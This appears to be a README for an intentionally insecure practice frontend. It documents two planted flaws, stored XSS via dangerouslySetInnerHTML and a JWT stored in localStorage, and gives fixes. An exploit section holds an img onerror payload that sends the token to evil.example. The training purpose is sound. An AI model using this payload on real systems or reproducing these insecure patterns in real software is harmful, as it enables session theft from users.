# Frontend — Planted Vulnerabilities

**⚠️ Intentionally insecure code for security-testing practice. Do not deploy.**

| # | Vulnerability | File | CWE |
|---|---|---|---|
| 1 | Stored XSS via `dangerouslySetInnerHTML` on task description | `src/components/TaskList.js` | CWE-79 |
| 2 | JWT stored in `localStorage`, readable by any script on the page | `src/components/Login.js` | CWE-922 |

## Example exploit — chaining #1 and #2

1. Log in and create a task whose description is:
   ```html
   <img src=x onerror="fetch('http://evil.example/steal?c='+localStorage.getItem('token'))">
   ```
2. Any user (including you, viewing your own task list) who renders that
   task triggers the script, because `TaskList.js` renders `description`
   with `dangerouslySetInnerHTML` and never sanitizes it.
3. The script reads the JWT straight out of `localStorage` (where `Login.js`
   put it) and exfiltrates it to an attacker-controlled endpoint — full
   session theft from a single XSS bug.

## Fixes

- Never use `dangerouslySetInnerHTML` for user-supplied content — render
  `task.description` as plain text (React escapes it automatically), or
  sanitize server-side with `sanitize-html`/`DOMPurify` if limited rich text
  is required.
- Don't store JWTs in `localStorage`. Have the backend set the token as an
  `httpOnly`, `Secure`, `SameSite=Strict` cookie so client-side JS can never
  read it, even if an XSS bug exists elsewhere.
